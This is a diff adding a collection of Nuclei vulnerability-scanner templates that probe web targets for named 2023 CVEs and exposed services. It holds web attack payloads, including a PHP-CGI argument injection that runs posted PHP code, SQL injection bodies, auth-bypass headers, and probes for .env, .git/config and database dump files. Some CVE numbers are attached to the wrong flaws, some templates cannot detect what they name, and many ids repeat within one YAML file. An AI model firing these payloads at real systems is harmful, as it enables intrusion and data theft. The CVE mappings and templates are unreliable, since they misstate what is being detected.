@@ -1,0 +1,297 @@
+# ============================================
+# Author: Tamilsevan S
+# Role: Cybersecurity | Ethical Hacker | Red Hat
+# Website: https://tamilselvan-official.web.app/
+# ============================================
+# Nuclei Templates - Extended Collection
+# ============================================
+
+## CVE-2023-34362 - MOVEit Transfer SQL Injection
+id: CVE-2023-34362
+info:
+  name: MOVEit Transfer SQL Injection
+  author: Tamilsevan S
+  severity: critical
+  tags: cve,cve2023,sql,sqli,moveit,progress
+  reference:
+    - https://www.mandiant.com/resources/blog/critical-vulnerability-progress-moveit-transfer
+    - https://www.progress.com/moveit-transfer/critical-vulnerability-2023
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/moveitisapi/moveitisapi.dll"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=m2&database=MoveitDMZ&server=127.0.0.1&instancename=sqlexpress&user=sa&password=test'
+    matchers:
+      - type: word
+        words:
+          - "SQL Server"
+          - "incorrect syntax"
+          - "unclosed quotation mark"
+        condition: or
+
+## CVE-2023-36884 - Microsoft Office Remote Code Execution
+id: CVE-2023-36884
+info:
+  name: Microsoft Office Remote Code Execution
+  author: Tamilsevan S
+  severity: high
+  tags: cve,cve2023,rce,microsoft,office
+  reference:
+    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36884
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers:
+      - type: word
+        words:
+          - "Microsoft Office"
+
+## CVE-2023-3824 - PHP CGI Argument Injection
+id: CVE-2023-3824
+info:
+  name: PHP CGI Argument Injection (CVE-2023-3824)
+  author: Tamilsevan S
+  severity: critical
+  tags: cve,cve2023,rce,php,cgi,injection
+  reference:
+    - https://github.com/php/php-src/security/advisories/GHSA-3qgc-jrrr-8jj7
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
+    body: |
+      <?php echo md5('CVE-2023-3824'); ?>
+    matchers:
+      - type: word
+        words:
+          - "1fc76cb929e6e95c02fd2c2a5ae1ff5c"
+
+## CVE-2023-32629 - WordPress Elementor SQL Injection
+id: CVE-2023-32629
+info:
+  name: WordPress Elementor SQL Injection
+  author: Tamilsevan S
+  severity: critical
+  tags: cve,cve2023,sql,sqli,wordpress,wp-plugin,elementor
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      action=elementor_ajax&editor_post_id=1&data=template%3D'+(SELECT MD5(1234))+--+-&nonce=anything
+    matchers:
+      - type: word
+        words:
+          - "81dc9bdb52d04dc20036dbd8313ed055"
+
+## CVE-2023-22515 - Confluence Broken Access Control
+id: CVE-2023-22515
+info:
+  name: Atlassian Confluence Broken Access Control
+  author: Tamilsevan S
+  severity: critical
+  tags: cve,cve2023,auth-bypass,confluence,atlassian
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/setup/setupadministrator.action"
+    matchers:
+      - type: word
+        words:
+          - "Setup Administrator"
+          - "Set up a new administrator account"
+
+## CVE-2023-26360 - Adobe ColdFusion Access Control Bypass
+id: CVE-2023-26360
+info:
+  name: Adobe ColdFusion Access Control Bypass
+  author: Tamilsevan S
+  severity: critical
+  tags: cve,cve2023,auth-bypass,coldfusion,adobe
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
+    headers:
+      Content-Type: multipart/form-data
+    matchers:
+      - type: status
+        status:
+          - 200
+
+## CVE-2023-20864 - VMware Aria Operations for Logs RCE
+id: CVE-2023-20864
+info:
+  name: VMware Aria Operations for Logs RCE
+  author: Tamilsevan S
+  severity: critical
+  tags: cve,cve2023,rce,vmware,aria,logs
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/deployment/install"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+## CVE-2023-28121 - WooCommerce Payments Auth Bypass
+id: CVE-2023-28121
+info:
+  name: WooCommerce Payments Authentication Bypass
+  author: Tamilsevan S
+  severity: critical
+  tags: cve,cve2023,auth-bypass,woocommerce,wordpress
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/wp-json/wc/v3/payments/accounts"
+    headers:
+      X-WCPAY-SETUP-NEEDED: 1
+      X-WCPAY-ONBOARDING-TEST-MODE: yes
+    matchers:
+      - type: status
+        status:
+          - 200
+
+## Generic Template - GitLab API Detection
+id: gitlab-api-detect
+info:
+  name: GitLab API Detection
+  author: Tamilsevan S
+  severity: info
+  tags: gitlab,api,exposure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v4/version"
+    matchers:
+      - type: word
+        words:
+          - "version"
+          - "revision"
+        condition: and
+
+## Generic Template - Docker API Exposure
+id: docker-api-exposed
+info:
+  name: Docker API Exposure
+  author: Tamilsevan S
+  severity: high
+  tags: docker,api,exposure,misconfig
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/version"
+      - "{{BaseURL}}/info"
+      - "{{BaseURL}}/containers/json"
+    matchers:
+      - type: word
+        words:
+          - "ApiVersion"
+          - "Version"
+        condition: or
+
+## Generic Template - Kubernetes API Exposure
+id: kubernetes-api-exposed
+info:
+  name: Kubernetes API Server Exposure
+  author: Tamilsevan S
+  severity: critical
+  tags: kubernetes,api,exposure,k8s
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/api/v1/namespaces"
+    matchers:
+      - type: word
+        words:
+          - "apiVersion"
+          - "kind"
+          - "namespaces"
+        condition: or
+
+## Generic Template - Jenkins Script Console
+id: jenkins-script-console
+info:
+  name: Jenkins Script Console Access
+  author: Tamilsevan S
+  severity: high
+  tags: jenkins,rce,console,misconfig
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/script"
+      - "{{BaseURL}}/jenkins/script"
+    matchers:
+      - type: word
+        words:
+          - "Script Console"
+          - "println"
+        condition: or
+
+## Generic Template - AWS S3 Bucket Misconfiguration
+id: aws-s3-bucket-detect
+info:
+  name: AWS S3 Bucket Detection
+  author: Tamilsevan S
+  severity: info
+  tags: aws,s3,bucket,misconfig
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    extractors:
+      - type: regex
+        regex:
+          - "s3://[a-z0-9.-]+"
+          - "S3://[a-z0-9.-]+"
+
+## Generic Template - Sensitive File Disclosure
+id: sensitive-files-disclosure
+info:
+  name: Sensitive File Disclosure
+  author: Tamilsevan S
+  severity: high
+  tags: exposure,sensitive,files
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/.git/config"
+      - "{{BaseURL}}/config.json"
+      - "{{BaseURL}}/config.xml"
+      - "{{BaseURL}}/backup.sql"
+      - "{{BaseURL}}/database.sql"
+      - "{{BaseURL}}/dump.sql"
+      - "{{BaseURL}}/backup.tar.gz"
+      - "{{BaseURL}}/backup.zip"
+    matchers:
+      - type: word
+        words:
+          - "DB_HOST"
+          - "DB_PASSWORD"
+          - "APP_KEY"
+          - "AWS_ACCESS_KEY_ID"
+        condition: or
